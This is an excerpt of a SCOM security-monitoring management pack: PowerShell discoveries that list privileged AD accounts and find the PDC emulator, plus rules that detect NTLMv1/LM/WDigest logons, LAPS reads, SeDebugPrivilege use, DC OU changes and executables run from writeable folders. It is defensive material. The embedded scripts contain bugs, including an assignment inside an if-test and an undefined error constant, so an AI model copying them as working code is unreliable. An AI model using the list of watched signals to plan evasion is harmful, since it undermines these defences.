        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.TimedPowerShell.DiscoveryProvider">
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <ScriptName>DiscoverAdminAccounts.PS1</ScriptName>
          <ScriptBody>param($sourceId,$managedEntityId,$computerName)
#Constants used for event logging
$SCRIPT_NAME			= 'DiscoverAdminAccounts.ps1'
$EVENT_LEVEL_ERROR 		= 1
$EVENT_LEVEL_WARNING 	= 2
$EVENT_LEVEL_INFO 		= 4

$SCRIPT_STARTED			= 811 #These are event IDs you are creating for logging.
$CLASS_CREATED			= 812
$SCRIPT_ENDED			= 815

function Log-DebugEvent
{
	param($eventNo,$message)

	$message = "`n" + $message
	if ($debug = $true)
	{
    	$api.LogScriptEvent($SCRIPT_NAME,$eventNo,$EVENT_LEVEL_INFO,$message)
	}
}
$api = New-Object -comObject 'MOM.ScriptAPI'
$discoveryData = $api.CreateDiscoveryData(0, $sourceId, $managedEntityId)

$message =	'Script started' + "`n" + `
			'Source ID: ' + $sourceId + "`n" + `
			'Managed Entity ID: ' + $managedEntityId + "`n" + `
			'Computer Name: ' + $computerName 
Log-DebugEvent $SCRIPT_STARTED $message #Will run whether there's a debug or not

# Verify AD module installed
$ADModule = "ActiveDirectory"
if (Get-Module -ListAvailable -Name $ADModule)
	{ 
	#Write-Host -f green "Active Directory Module exists"
	Add-PSSnapin $ADModule -ErrorAction SilentlyContinue
	$ErrorActionPreference = "SilentlyContinue"
 	} 
Else
	{ 
	#Write-Host -f red "Active Directory Module does not exist"
	$message = 'Active Directory module NOT loaded on $computerName '
	Log-DebugEvent $SCRIPT_ERROR $EVENT_LEVEL_ERROR $message
	}

$AdminUsers = Get-ADUser -Filter {(AdminCount -eq 1)}
foreach ($user in $AdminUsers)
{
$instance = $discoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.AdminAccounts']$")
$instance.AddProperty("$MPElement[Name='Security.Monitoring.AdminAccounts']/DistinguishedName$", $user.DistinguishedName)
$instance.AddProperty("$MPElement[Name='Security.Monitoring.AdminAccounts']/Enabled$", $user.Enabled)
$instance.AddProperty("$MPElement[Name='Security.Monitoring.AdminAccounts']/Name$", $user.Name)
$instance.AddProperty("$MPElement[Name='Security.Monitoring.AdminAccounts']/SAMAccountName$", $user.SamAccountName)
$instance.AddProperty("$MPElement[Name='Security.Monitoring.AdminAccounts']/UPN$", $user.UserPrincipalName)
					 $discoveryData.AddInstance($instance)
						$message =	'Created' + $currfile + 'Service class' + "`n" + `
						'Computer Name: ' + $computerName + "`n"
					Log-DebugEvent $CLASS_CREATED $message
}
Log-DebugEvent -eventNo $SCRIPT_ENDED -$message
#Return the discovery data.
$discoveryData</ScriptBody>
          <Parameters>
            <Parameter>
              <Name>sourceID</Name>
              <Value>$MPElement$</Value>
            </Parameter>
            <Parameter>
              <Name>managedEntityID</Name>
              <Value>$Target/Id$</Value>
            </Parameter>
            <Parameter>
              <Name>computerName</Name>
              <Value>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</Value>
            </Parameter>
          </Parameters>
          <TimeoutSeconds>300</TimeoutSeconds>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.PDCEmulatorDiscovery" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.PDC_Emulator">
            <Property TypeID="Security.Monitoring.PDC_Emulator" PropertyID="Name" />
          </DiscoveryClass>
        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.TimedPowerShell.DiscoveryProvider">
          <IntervalSeconds>86400</IntervalSeconds>
          <SyncTime />
          <ScriptName>DiscoverAdminAccounts.PS1</ScriptName>
          <ScriptBody>param($sourceId,$managedEntityId,$computerName)
#Constants used for event logging
$SCRIPT_NAME			= 'DiscoverPDCEmulator.ps1'
$EVENT_LEVEL_ERROR 		= 1
$EVENT_LEVEL_WARNING 	= 2
$EVENT_LEVEL_INFO 		= 4

$SCRIPT_STARTED			= 811 #These are event IDs you are creating for logging.
$CLASS_CREATED			= 812
$SCRIPT_ENDED			= 815

function Log-DebugEvent
{
	param($eventNo,$message)

	$message = "`n" + $message
	if ($debug = $true)
	{
    	$api.LogScriptEvent($SCRIPT_NAME,$eventNo,$EVENT_LEVEL_INFO,$message)
	}
}
$api = New-Object -comObject 'MOM.ScriptAPI'
$discoveryData = $api.CreateDiscoveryData(0, $sourceId, $managedEntityId)

$message =	'Script started' + "`n" + `
			'Source ID: ' + $sourceId + "`n" + `
			'Managed Entity ID: ' + $managedEntityId + "`n" + `
			'Computer Name: ' + $computerName 
Log-DebugEvent $SCRIPT_STARTED $message #Will run whether there's a debug or not

# Verify AD module installed
$ADModule = "ActiveDirectory"
if (Get-Module -ListAvailable -Name $ADModule)
	{ 
	#Write-Host -f green "Active Directory Module exists"
	Add-PSSnapin $ADModule -ErrorAction SilentlyContinue
	$ErrorActionPreference = "SilentlyContinue"
 	} 
Else
	{ 
	#Write-Host -f red "Active Directory Module does not exist"
	$message = 'Active Directory module NOT loaded on $computerName '
	Log-DebugEvent $SCRIPT_ERROR $EVENT_LEVEL_ERROR $message
	}

$PDC = get-addomain | Select-Object -Property PDCEmulator
$DC = Get-ADDomainController -Identity $computerName
$name = ([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname

if ($PDC.PDCEmulator -eq $DC.HostName)
{
$instance = $discoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.PDC_Emulator']$")
$instance.AddProperty("$MPElement[Name='Windows!Microsoft.Windows.Computer']/PrincipalName$", $computerName)
$instance.AddProperty("$MPElement[Name='Security.Monitoring.PDC_Emulator']/Name$", $name)
					 $discoveryData.AddInstance($instance)
						$message =	'Created' + $currfile + 'Service class' + "`n" + `
						'Computer Name: ' + $computerName + "`n"
					Log-DebugEvent $CLASS_CREATED $message
}
Log-DebugEvent -eventNo $SCRIPT_ENDED -$message
#Return the discovery data.
$discoveryData</ScriptBody>
          <Parameters>
            <Parameter>
              <Name>sourceID</Name>
              <Value>$MPElement$</Value>
            </Parameter>
            <Parameter>
              <Name>managedEntityID</Name>
              <Value>$Target/Id$</Value>
            </Parameter>
            <Parameter>
              <Name>computerName</Name>
              <Value>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</Value>
            </Parameter>
          </Parameters>
          <TimeoutSeconds>300</TimeoutSeconds>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.DiscoverWriteableFileLocations" Enabled="true" Target="Security.Monitoring.WriteableLocationsSeedClass" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.WriteableLocations">
            <Property TypeID="Security.Monitoring.WriteableLocations" PropertyID="FolderPath" />
          </DiscoveryClass>
        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="SecurityMonitoringMP.Discoveries.DiscoverWriteableFileLocations">
          <FrequencyInSeconds>86400</FrequencyInSeconds>
          <AdditionalLocations />
          <TimeOutSeconds>600</TimeOutSeconds>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.DA.DCDiscovery" Enabled="false" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.SecurityMonitoringDA.DomainControllers">
            <Property TypeID="Security.Monitoring.SecurityMonitoringDA.DomainControllers" PropertyID="DomainDnsName" />
            <Property TypeID="System!System.Entity" PropertyID="DisplayName" />
          </DiscoveryClass>
          <DiscoveryClass TypeID="Security.Monitoring.SecurityMonitoringDA">
            <Property TypeID="Security.Monitoring.SecurityMonitoringDA" PropertyID="DomainDnsName" />
            <Property TypeID="System!System.Entity" PropertyID="DisplayName" />
          </DiscoveryClass>
          <DiscoveryRelationship TypeID="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" />
          <DiscoveryRelationship TypeID="Security.Monitoring.SecurityMonitoringDARelationships" />
        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="Security.Monitoring.DistributedApplication.DataSource">
          <IntervalSeconds>86400</IntervalSeconds>
          <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</ComputerName>
          <DomainDnsName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/DomainDnsName$</DomainDnsName>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.DA.MSDiscovery" Enabled="false" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.SecurityMonitoringDA">
            <Property TypeID="Security.Monitoring.SecurityMonitoringDA" PropertyID="DomainDnsName" />
            <Property TypeID="System!System.Entity" PropertyID="DisplayName" />
          </DiscoveryClass>
          <DiscoveryClass TypeID="Security.Monitoring.SecurityMonitoringDA.MemberServers">
            <Property TypeID="Security.Monitoring.SecurityMonitoringDA.MemberServers" PropertyID="DomainDnsName" />
            <Property TypeID="System!System.Entity" PropertyID="DisplayName" />
          </DiscoveryClass>
          <DiscoveryRelationship TypeID="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" />
          <DiscoveryRelationship TypeID="Security.Monitoring.SecurityMonitoringDARelationshipsforMS" />
        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="Security.Monitoring.DistributedApplicationMS.DataSource">
          <IntervalSeconds>86400</IntervalSeconds>
          <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</ComputerName>
          <DomainDnsName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/DomainDnsName$</DomainDnsName>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.PopulateExtendedWriteableDirectoryComputerGroup" Enabled="true" Target="Security.Monitoring.WindowsComputersExtendedWriteableDirectoryMonitoring" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes />
        <DataSource ID="DS" TypeID="SystemCenter!Microsoft.SystemCenter.GroupPopulator">
          <RuleId>$MPElement$</RuleId>
          <GroupInstanceId>$MPElement[Name='Security.Monitoring.WindowsComputersExtendedWriteableDirectoryMonitoring']$</GroupInstanceId>
          <MembershipRules>
            <MembershipRule>
              <MonitoringClass>$MPElement[Name='Windows!Microsoft.Windows.Computer']$</MonitoringClass>
              <RelationshipClass>$MPElement[Name='SystemCenter!Microsoft.SystemCenter.ComputerGroupContainsComputer']$</RelationshipClass>
              <Expression>
                <Contains>
                  <MonitoringClass>$MPElement[Name='Security.Monitoring.WriteableLocations']$</MonitoringClass>
                </Contains>
              </Expression>
            </MembershipRule>
          </MembershipRules>
        </DataSource>
      </Discovery>
      <Discovery ID="Security.Monitoring.Discoveries.UserWriteableLocationSeed" Enabled="true" Target="Windows!Microsoft.Windows.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal">
        <Category>Discovery</Category>
        <DiscoveryTypes>
          <DiscoveryClass TypeID="Security.Monitoring.WriteableLocationsSeedClass">
            <Property TypeID="Windows!Microsoft.Windows.Computer" PropertyID="PrincipalName" />
          </DiscoveryClass>
        </DiscoveryTypes>
        <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.FilteredRegistryDiscoveryProvider">
          <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</ComputerName>
          <RegistryAttributeDefinitions>
            <RegistryAttributeDefinition>
              <AttributeName>AppExists</AttributeName>
              <Path>SOFTWARE\SCOMSecurityMonitoringMP\DiscoverUserWriteableLocations</Path>
              <PathType>0</PathType>
              <AttributeType>0</AttributeType>
            </RegistryAttributeDefinition>
          </RegistryAttributeDefinitions>
          <Frequency>86400</Frequency>
          <ClassId>$MPElement[Name="Security.Monitoring.WriteableLocationsSeedClass"]$</ClassId>
          <InstanceSettings>
            <Settings>
              <Setting>
                <Name>$MPElement[Name="Windows!Microsoft.Windows.Computer"]/PrincipalName$</Name>
                <Value>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/PrincipalName$</Value>
              </Setting>
            </Settings>
          </InstanceSettings>
          <Expression>
            <SimpleExpression>
              <ValueExpression>
                <XPathQuery Type="Boolean">Values/AppExists</XPathQuery>
              </ValueExpression>
              <Operator>Equal</Operator>
              <ValueExpression>
                <Value Type="Boolean">true</Value>
              </ValueExpression>
            </SimpleExpression>
          </Expression>
        </DataSource>
      </Discovery>
    </Discoveries>
    <Rules>
      <Rule ID="Security.Monitoring.EventCollection.AccountLockouts" Enabled="false" Target="Security.Monitoring.PDC_Emulator" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>.</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4740</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Security-Auditing</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Collect.SMBv1Connections" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>None</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Security.Monitoring.SMBv1Connections.DS">
            <IntervalSeconds>600</IntervalSeconds>
            <SyncTime />
            <TimeOut>300</TimeOut>
          </DataSource>
        </DataSources>
        <ConditionDetection ID="CD" TypeID="System!System.Event.GenericDataMapper">
          <EventOriginId>$Target/Id$</EventOriginId>
          <PublisherId>$MPElement$</PublisherId>
          <PublisherName>SMBv1</PublisherName>
          <Channel>SMBv1</Channel>
          <LoggingComputer />
          <EventNumber>911</EventNumber>
          <EventCategory>3</EventCategory>
          <EventLevel>0</EventLevel>
          <UserName />
          <Params />
        </ConditionDetection>
        <WriteActions>
          <WriteAction ID="DW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
          <WriteAction ID="DB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.CollectLegacyTLSEvents" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">36880</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">TLS 1.0</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">TLS 1.1</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.EventCollection.LanMan" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">NTLM</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[15]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">LM</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.CollectionRule.CollectLAPSEvents" Comment="Event Collection rule for LAPS Events" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4662</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventPublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">AdmPwd</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.EventCollection.NTLMV1" Enabled="false" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">NTLM</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[15]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">NTLMv1</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.EventCollection.WdigestAuthentication" Enabled="false" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4776</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[1]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">WDigest</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="CollectToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="CollectToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.Event.SeDebugPrivilegeEscalation" Enabled="false" Target="Windows!Microsoft.Windows.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4703</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">SeDebugPrivilege</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>NotEqual</Operator>
                    <ValueExpression>
                      <Value Type="String">C:\Windows\System32\wbem\WmiPrvSE.exe</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.SeDebugPrivilegeEscalation.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/EventDescription$</AlertParameter1>
            </AlertParameters>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.SecurityMonitoring.Event.DCOUModify" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>.</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">organizationalUnit</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[7]</XPathQuery>
                    </ValueExpression>
                    <Operator>MatchesWildcard</Operator>
                    <Pattern>*Domain Controllers*</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4662</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.SecurityMonitoring.Event.DCOUModify.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ExecutableRunFromUserWriteableDirectory" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.WriteableDirectories.DS">
            <OverrideableExe1>Replacewithspecificexe</OverrideableExe1>
            <OverrideableExe2>Replacewithspecificexe</OverrideableExe2>
            <OverrideableExe3>Replacewithspecificexe</OverrideableExe3>
            <OverrideableFilePath1>Replacewithspecificpath</OverrideableFilePath1>
            <OverrideableFilePath2>Replacewithspecificpath</OverrideableFilePath2>
            <OverrideableFilePath3>Replacewithspecificpath</OverrideableFilePath3>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ExecutableRunFromUserWriteableDirectory.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
              <AlertParameter5>$Data/Params/Param[14]$</AlertParameter5>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended" Enabled="true" Target="Security.Monitoring.WriteableLocations" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS">
            <OverrideableExe1>ReplacewithExetoOverride</OverrideableExe1>
            <OverrideableExe2>ReplacewithExetoOverride</OverrideableExe2>
